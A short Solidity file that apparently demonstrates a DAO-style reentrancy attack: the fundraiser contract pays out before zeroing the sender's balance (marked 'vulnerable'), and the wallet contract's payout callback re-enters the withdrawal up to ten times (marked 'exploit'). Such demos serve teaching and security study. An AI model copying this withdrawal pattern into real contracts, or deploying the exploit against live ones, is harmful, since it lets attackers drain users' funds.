pragma solidity ^0.4.11;

contract DAOFundraiser {
	
	mapping(address=>uint) balances;
	
	
	function withdrawAllMyCoins() public {
		
		uint withdrawAmount = balances[msg.sender];
		
		TypicalWallet wallet = TypicalWallet(msg.sender);
		wallet.payout.value(withdrawAmount)();
		
		//vulnerable
		balances[msg.sender] = 0;

	}
	
	function getBalance() constant public returns (uint){
		return this.balance;
	}
	
	function contribute() public payable{
		balances[msg.sender] += msg.value;
	}
	
	function() public payable{
		
	}
}



contract TypicalWallet{
	
	DAOFundraiser fundraiser;
	uint r= 10;
	
	function TypicalWallet(address fundraiserAddress) public {
		fundraiser = DAOFundraiser(fundraiserAddress);
	}
	
	function contribute(uint amount) public {
		fundraiser.contribute.value(amount)();
	}
	
	function withdraw()public {
		fundraiser.withdrawAllMyCoins();
	}
	
	function getBalance() constant public returns (uint){
		return this.balance;
	}
	
	function payout() payable public {
	    // exploit
		if(r>0){
			r--;
			fundraiser.withdrawAllMyCoins();
		}
 // receive payment
 // log or do other activity
 // complex codes
	    
	}
	
	function() payable public {
		
	}
}